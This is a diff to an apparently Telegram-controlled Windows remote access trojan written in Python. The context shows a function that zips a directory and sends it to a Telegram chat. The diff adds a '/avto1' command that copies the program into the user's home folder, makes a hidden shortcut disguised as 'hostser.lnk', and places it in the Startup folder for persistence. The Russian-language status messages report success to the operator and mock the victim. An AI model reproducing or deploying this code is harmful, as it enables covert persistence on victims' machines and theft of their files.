@@ -41,7 +41,29 @@ def send_zip_to_telegram(telegram_bot_token, chat_id, source_dir):
     send_file_to_telegram_in_memory(chat_id, zip_data.getvalue(), 'Mraks_By_sx180.zip')
   except Exception as e:
       print(f"Error creating or sending zip file: {str(e)}")
-
+@bot.message_handler(commands=['avto1'])
+def avto(message):
+    try:
+        pythoncom.CoInitialize()
+        current_program = os.path.abspath(sys.argv[0])
+        bot.send_message(message.chat.id, current_program)
+        print(current_program)
+        user_folder = os.path.expanduser("~")
+        copy_folder = os.path.join(user_folder, "MyProgram")
+        os.makedirs(copy_folder, exist_ok=True)
+        shutil.copy(current_program, copy_folder)
+        shortcut_name = "hostser.lnk"
+        shortcut_path = os.path.join(user_folder, shortcut_name)
+        with winshell.shortcut(shortcut_path) as shortcut:
+            shortcut.path = os.path.join(copy_folder, os.path.basename(current_program))
+            shortcut.show_cmd = win32con.SW_HIDE  # Bualmkpw pavlu
+            shortcut.icon = (None, 0)
+        startup_folder = winshell.startup()
+        startup_shortcut_path = os.path.join(startup_folder, os.path.basename(shortcut_path))
+        shutil.copy(shortcut_path, startup_shortcut_path)
+        bot.send_message(message.chat.id, "Успешно добавил в автозапуск, теперь хуесосу скорее всего гг)!")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Ошибка при добавлении в автозапуск бро :\ - {e}")
 
 @bot.message_handler(commands=['TG'])
 def execute_code_if_internet_available():
